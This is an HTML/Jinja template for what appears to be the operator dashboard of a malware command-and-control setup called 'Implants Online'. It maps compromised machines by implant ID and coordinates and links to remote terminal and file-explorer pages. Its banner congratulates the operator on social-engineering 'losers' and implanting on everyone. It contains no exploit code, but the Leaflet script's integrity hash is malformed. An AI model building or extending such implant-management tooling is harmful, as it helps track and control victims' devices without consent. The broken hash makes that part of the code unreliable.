<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Super Secret Endpoint Slay</title>

  <!--<link href="{{ url_for('static', filename='css/style.css') }}" rel="stylesheet">-->
  <script src="{{ url_for('static', filename='js/main.js') }}"></script>

  <!-- Bootstrap CSS -->
  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
  <!-- Leaflet CSS -->
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" integrity="sha512-xodZBNTC5n17Xt2atTPuE1HxjVMSvLVW9ocqUKLsCC5CXdbqCmblAshOMAS6/keqq/sMZMZ19scR4PsZChSR7A==" crossorigin=""/>
  <!-- Your custom CSS file -->
  <script src="https://cdn.jsdelivr.net/npm/jquery"></script>
  <script src="https://cdn.jsdelivr.net/npm/jquery.terminal/js/jquery.terminal.min.js"></script>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery.terminal/css/jquery.terminal.min.css"/>
  <!--<link href="static/css/style.css" rel="stylesheet">-->
  <style>
    #map {
      height: 80vh; /* Adjust the height as needed */
    }
  </style>
</head>
<body>
  <header>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
      <div class="container-fluid">
        <div class="collapse navbar-collapse" id="navbarNav">
          <ul class="navbar-nav">
            <li class="nav-item">
              <a class="nav-link active" aria-current="page" href="../client">Terminal and Map</a>
            </li>
            <li class="nav-item">
              <a class="nav-link active" href="../explorer">File explorer</a>
            </li>
            <li class="nav-item">
              <a class="nav-link active" href="../terminal">Terminal</a>
            </li>
          </ul>
        </div>
      </div>
    </nav>
  </header>
  <div class="px-4 pt-5 my-3 text-center border-bottom">
    <div class="pb-3">
      <h1 class="display-4 fw-bold">Implants Online</h1>
    </div>
    <div class="col-lg-6 mx-auto">
      <p class="mb-4 pb-3">
        Wow gurls youre really killing the game out here. look at all these losers falling victim to your
        quick wit and overall charm. Social engineering and implanting on everyone. The world better watch
        out for you!
      </p>
    </div>
  </div>

  <div class="container mt-5">
    <div class="row">
      <div class="col-md-12"> <!-- Modified to span the full width -->
        <div id="map"></div>
      </div>
    </div>
  </div>

  <!-- Leaflet JS -->
  <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js" integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NO4Q+wdjj2XXEUsJf2/4MVJr2xpk7IeKEOCyirjNfcm+.JWNCQ==" crossorigin=""></script>

  <script>
    var map = L.map('map');
  
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      maxZoom: 19,
    }).addTo(map);
  
    var implantCoordinates = {{ implant_coordinates | tojson | safe }};
  
    var markerArray = [];
    implantCoordinates.forEach(function(coords) {
      var popupContent = `Latitude: ${coords[0]}<br>Longitude: ${coords[1]}<br>Implant ID: ${coords[2]}`;
      var marker = L.marker(coords).addTo(map).bindPopup(popupContent);
      markerArray.push(marker);
    });
  
    var bounds = new L.LatLngBounds();
    markerArray.forEach(function(marker) {
      bounds.extend(marker.getLatLng());
    });
  
    map.fitBounds(bounds);
  </script>
  
  <script>
    // JavaScript function to handle form submission on Enter key press
    function submitFormOnEnter(event) {
      if (event.keyCode === 13) {  // Check if the pressed key is Enter
        event.preventDefault();  // Prevent the default form submission
        document.getElementById('myForm').submit();  // Submit the form
      }
    }

    // Update the response container with the received response
    function updateResponse(response) {
      var responseContainer = document.getElementById('response-container');
      responseContainer.innerHTML = '<strong>Response:</strong> <span style="color: black;">' + response;
    }

    // Attach keydown event listener to the form input field(s)
    document.addEventListener('DOMContentLoaded', function() {
      document.querySelector('.terminal-input').addEventListener('keydown', submitFormOnEnter);
    });
  </script>
</body>
</html>
